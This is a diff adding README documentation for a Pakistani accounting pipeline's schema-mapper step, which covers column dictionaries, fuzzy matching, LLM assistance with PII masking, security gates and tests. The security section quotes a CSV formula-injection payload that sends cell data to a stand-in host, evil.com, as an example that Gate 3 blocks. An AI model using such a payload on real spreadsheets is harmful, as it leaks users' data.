@@ -1273,3 +1273,213 @@ For each row, it:
 
 This is where `Taareekh` becomes `transaction_date` and `Raqam` becomes
 `net_amount`.
+
+
+# Neural Ledger — Step 4: Schema Mapper
+
+## Overview
+
+The Schema Mapper is the intelligence layer between Bronze and Silver. It solves
+the hardest problem in the entire ingestion pipeline: Pakistani accountants use
+wildly different column names for the same financial data. This step maps every
+incoming column name — regardless of language, software, or personal convention —
+to the Neural Ledger standard schema.
+
+---
+
+## Files Created
+
+```
+neural_ledger/
+├── src/
+│   └── phase1/
+│       └── schema_mapper/
+│           ├── __init__.py
+│           ├── dictionary.py    # Pakistani column knowledge base (4a)
+│           ├── fuzzy_mapper.py  # Layers 1+2 fuzzy matching (4b)
+│           ├── security.py      # 7 security gates (4c)
+│           └── mapper.py        # Orchestrator (4d)
+└── tests/
+    └── phase1/
+        └── test_schema_mapper.py   # 59 tests — all passing
+```
+
+---
+
+## The Four-Layer Hybrid Strategy
+
+```
+COLUMN ARRIVES FROM BRONZE
+        ↓
+LAYER 1 — Known mapping lookup
+  Check bronze_schema_mappings for this software
+  If user-confirmed → confidence 1.0 → auto-map
+  If confidence ≥ 0.85 → auto-map silently
+        ↓ (unresolved columns)
+LAYER 2 — Fuzzy rule-based matching
+  Exact case-insensitive → confidence 0.95
+  Normalized match (strip spaces/punctuation) → 0.85
+  N-gram fuzzy similarity → proportional
+  Substring match → 0.70
+        ↓ (still below threshold)
+LAYER 3 — LLM assist
+  Headers + 2 sanitized sample rows → Groq
+  PII masked before sending
+  Output validated by Gate 6
+        ↓ (still unresolved)
+LAYER 4 — User confirmation
+  Flagged in needs_user_review
+  User confirms once → saved to DB forever
+```
+
+---
+
+## The Dictionary (4a)
+
+The dictionary covers:
+
+**Software-specific exact mappings** (confidence 0.95) for:
+Tally/TallyPrime, QuickBooks Desktop, QuickBooks Online, LedgerMax,
+Xero, Odoo/ERPNext, Sage 50, Moneypex, all Pakistani bank PDFs
+(HBL, UBL, Alfalah, Meezan, NBP).
+
+**General mappings** (confidence 0.80) — 100+ common column name
+variations across all software.
+
+**Urdu mappings** (confidence 0.90) — both Unicode Urdu script
+(تاریخ, رقم, تفصیل) and Roman Urdu (Taareekh, Raqam, Tafseelat).
+
+**Abbreviation mappings** (confidence 0.70) — Dr, Cr, Dt, Amt, Ref, etc.
+
+**FBR tax category mappings** — maps transaction categories to FBR
+sections for compliance signal generation. Includes WHT rates for
+salary (149), services (153), supplies (153), rent (155), dividends (150).
+
+**Transaction type normalization** — maps Payment/BP/CP/Bhugtan all
+to "payment", JV/Journal Voucher/J/V all to "journal", etc.
+
+---
+
+## The Security Layer (4c)
+
+Seven gates protect the pipeline:
+
+| Gate | Timing | What it prevents |
+|---|---|---|
+| 1. File size check | Pre-mapping | DoS via huge files |
+| 2. Row count check | Pre-mapping | Memory exhaustion |
+| 3. Formula neutralization | Pre-mapping | Excel/CSV injection attacks |
+| 4. Reserved name protection | Pre-mapping | Schema confusion attacks |
+| 5. Unicode normalization | Pre-mapping | Encoding bypass attacks |
+| 6. LLM output validation | Post-LLM | Prompt injection via LLM response |
+| 7. Output sanitization | Post-mapping | Type coercion, amount parsing |
+
+**Formula injection example blocked:**
+A malicious cell value `=HYPERLINK("evil.com?data="&A1,"Click")` is
+detected by Gate 3 and stored as `FORMULA_REMOVED:=HYPERLINK(...)` — never
+executed, fully auditable.
+
+**Reserved name example blocked:**
+If an incoming file has a column called `quality_score` (an internal
+Neural Ledger field), Gate 4 renames it to `raw_quality_score` before
+any mapping happens. The schema contract cannot be violated.
+
+**Amount parsing Gate 7 handles:**
+- `"PKR 45,000"` → `45000.0`
+- `"Rs. 12,500.50"` → `12500.5`
+- `"(5,000)"` → `-5000.0` (accountant convention for negatives)
+- `"N/A"` → `None`
+
+---
+
+## Privacy in LLM Layer
+
+The LLM (Groq) receives only:
+- Column header names
+- Up to 2 sample cell values per column (truncated to 50 chars)
+- PII patterns masked: phone numbers → `[PHONE]`, NTN → `[NTN]`,
+  CNIC → `[CNIC]`, bank accounts → `[ACCOUNT]`
+
+The LLM never sees: actual transaction amounts, vendor names beyond
+the 2 sample rows, any personally identifiable information.
+
+---
+
+## Usage
+
+```python
+from src.phase1.schema_mapper.mapper import SchemaMapper
+
+mapper = SchemaMapper()
+
+result = mapper.map(
+    columns=["Taareekh", "Raqam", "Tafseelat", "Vendor Name"],
+    rows=rows,              # raw row dicts from Bronze
+    source_software="manual_excel",
+    batch_id="abc-123",
+    file_size_bytes=24576,
+)
+
+print(result.column_mapping)
+# {
+#   "Taareekh":    "transaction_date",
+#   "Raqam":       "net_amount",
+#   "Tafseelat":   "description",
+#   "Vendor Name": "vendor",
+# }
+
+print(result.coverage)         # 1.0 — all columns mapped
+print(result.has_date)         # True
+print(result.has_amount)       # True
+print(result.needs_user_review) # [] — nothing needed
+print(result.security_warnings) # [] — no issues
+```
+
+---
+
+## Test Coverage
+
+**59 tests — all passing.**
+
+```bash
+python -m pytest tests/phase1/test_schema_mapper.py -v
+```
+
+| Class | Tests | Coverage |
+|---|---|---|
+| `TestDictionary` | 15 | All software mappings, Urdu, reserved names, FBR, tx types |
+| `TestFuzzyMapper` | 17 | Tally, QuickBooks, LedgerMax, Urdu, abbreviations, edge cases |
+| `TestSecurity` | 19 | All 7 gates, formula injection, amount parsing, LLM validation |
+| `TestSchemaMapperIntegration` | 6 | End-to-end Tally, manual Excel, formula attack, reserved names |
+
+---
+
+## Setup
+
+### Install dependencies (no new ones required for Step 4)
+All dependencies were already installed in Steps 2 and 3.
+
+### Add the new files
+```
+src/phase1/schema_mapper/__init__.py    (empty)
+src/phase1/schema_mapper/dictionary.py
+src/phase1/schema_mapper/fuzzy_mapper.py
+src/phase1/schema_mapper/security.py
+src/phase1/schema_mapper/mapper.py
+tests/phase1/test_schema_mapper.py
+```
+
+### Run tests
+```bash
+python -m pytest tests/phase1/test_schema_mapper.py -v
+```
+
+---
+
+## What Comes Next
+
+**Step 5 — Silver Writer + Normalization Engine**
+
+Reads Bronze rows with `processing_status = 'pending'`, applies the
+column mapping from Step 4, normalizes dates and amounts, detects
+language, deduplicates, masks PII, and writes to `silver_transactions`.
